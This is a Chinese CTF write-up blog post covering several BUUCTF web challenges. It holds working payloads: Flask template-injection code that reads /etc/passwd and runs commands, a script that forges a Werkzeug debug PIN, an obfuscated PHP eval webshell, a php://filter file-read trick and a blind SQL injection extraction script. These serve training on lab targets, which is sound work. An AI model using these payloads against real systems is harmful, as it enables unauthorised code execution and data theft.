---
title: "BUUCTF Web Writeup 5"
date: 2022-08-31T17:33:08+08:00
lastmod: 2022-08-31T17:33:08+08:00
draft: true
author: "X1r0z"

tags: ['ctf']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

BUUCTF 刷题记录...

<!--more-->

## [GYCTF2020]FlaskApp

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131535730.png)

提示如下

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131535892.png)

参考文章 [https://xz.aliyun.com/t/8092](https://xz.aliyun.com/t/8092)

大致就是说, 一般情况下同一台机器生成的 flask pin 是一样的, 我们可以通过 ssti 读取对应文件, 然后构造 pin 登录, 进入 debug 模式下的交互式终端, 最终 getshell

base64 解密的时候随便输点东西

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131605529.png)

点击爆出的源码右边的 logo 会显示如下内容

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131606522.png)

很明显这个 flask app 开启了 debug 模式

回到之前的报错代码

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131610362.png)

使用了 `render_template_string` 进行渲染

填入 base64 编码后的 `{{ config }}`

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131612172.png)

存在 ssti

过滤了 \_\_import\_\_ os popen 之类的关键词, 可以拼接绕过 (这时候其实可以非预期了...)

根据报错信息可以知道环境是 python3, 构造下 payload

先读取 /etc/passwd

```python
{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}
{%endif%}
{%endfor%}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131614148.png)

推测用户是 flaskweb

然后在报错信息中找到 app.py 的路径

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131615112.png)

读取 mac 地址

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131616558.png)

用 `int('bea35d10966d',16)` 转成十进制后为 `209608850314861`

最后是读取系统 id, 这个在不同 flask 版本 (2020.1.5 前后) 的拼接方式还不太一样... 参考文章里写的比较详细

测试的时候发现直接读取 /etc/machine-id 就行

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131621946.png)

利用文章里给出的脚本生成 pin

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'flaskweb'# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '209608850314861',# str(uuid.getnode()),  /sys/class/net/ens33/address
    '1408f836b0ca514d796cbf8960e45fa1'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

```
273-975-565
```

输入后得到交互式终端

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131622346.png)

非预期解的方式是直接字符串拼接绕过过滤, 然后导入 os 执行命令

```python
{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x.__init__.__globals__['__builtins__']['__imp' + 'ort__']('o'+'s').__dict__['po' + 'pen']('cat /this_is_the_f'+'lag.txt').read() }}
{%endif%}
{%endfor%}
```

## [极客大挑战 2019]RCE ME

```php
<?php
error_reporting(0);
if(isset($_GET['code'])){
  $code=$_GET['code'];
  if(strlen($code)>40){
      die("This is too Long.");
   }
  if(preg_match("/[A-Za-z0-9]+/",$code)){
      die("NO.");
    }
  @eval($code);
}
else{
  highlight_file(__FILE__);
}
?>
```

考察无字母数字 webshell

php7 环境, 可以直接用取反

```php
<?php
echo urlencode(~"assert");
echo "<br/>";
echo urlencode(~'eval($_REQUEST[1]);');
?>
```

使用 system 执行命令失败了, 估计是开了 disable_functions, 换成了一句话

```
(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%CE%A2%D6%C4);
```

看一下 phpinfo

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131720790.png)

禁用了一大堆命令执行相关的函数...

蚁剑连接后看到了 flag readflag 两个文件

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131719800.png)

直接查看 /flag 为空, 猜测是要运行 readflag 这个命令才行, 所以需要 bypass disable_functions

这里用的是 php7 backtrace UAF

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131722581.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131722031.png)

## [MRCTF2020]套娃

右键源代码

```php
$query = $_SERVER['QUERY_STRING'];

 if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
    die('Y0u are So cutE!');
}
 if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo "you are going to the next ~";
}
```

利用的是 php 字符串解析的特性, 之前也遇到过

[https://www.freebuf.com/articles/web/213359.html](https://www.freebuf.com/articles/web/213359.html)

将 `b_u_p_t` 改成 `b.u.p.t`

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131748083.png)

还需要绕过正则, 加一个 `%0a` 就可以了, 因为这里默认是单行匹配, 不会匹配到换行符

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131749532.png)

访问 secrettw.php

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131749312.png)

aaencode, 在 F12 控制台中输入

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131749938.png)

post 一下

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131750817.png)

```php
<?php 
error_reporting(0); 
include 'takeip.php';
ini_set('open_basedir','.'); 
include 'flag.php';

if(isset($_POST['Merak'])){ 
    highlight_file(__FILE__); 
    die(); 
} 


function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
echo 'Local access only!'."<br/>";
$ip = getIp();
if($ip!='127.0.0.1')
echo "Sorry,you don't have permission!  Your ip is :".$ip;
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
echo "Your REQUEST is:".change($_GET['file']);
echo file_get_contents(change($_GET['file'])); }
?>
```

检测 ip 的原理经测试发现利用的是 `Client-IP`, 2333 的传参可以用 data 协议

然后 change 这里很容易就可以写出对应的逆函数

```php
<?php
function encode($v){
  $re = '';
  for ($i=0;$i<strlen($v);$i++){
    $re .= chr(ord($v[$i]) - $i*2);
  }
  return base64_encode($re);
}

echo encode('php://filter/read=convert.base64-encode/resource=flag.php');
?>
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209140859724.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209140859604.png)

## [WUSTCTF2020]颜值成绩查询

简单 sql 注入

```python
import time
import requests

url = 'http://4970b328-dd5a-492d-bd32-f084c1f25f13.node4.buuoj.cn:81/index.php?stunum=1'

dicts = ',{}-0123456789abcdefgl'

flag = ''

for i in range(1,100):
    for s in dicts:
        time.sleep(0.5)
        payload = '/**/and/**/ascii(substr((select/**/group_concat(flag,value)/**/from/**/flag),{},1))={}'.format(i,ord(s))
        res = requests.get(url + payload, timeout=30)
        if 'admin' in res.text:
            flag += s
            print(flag)
```

## [FBCTF2019]RCEService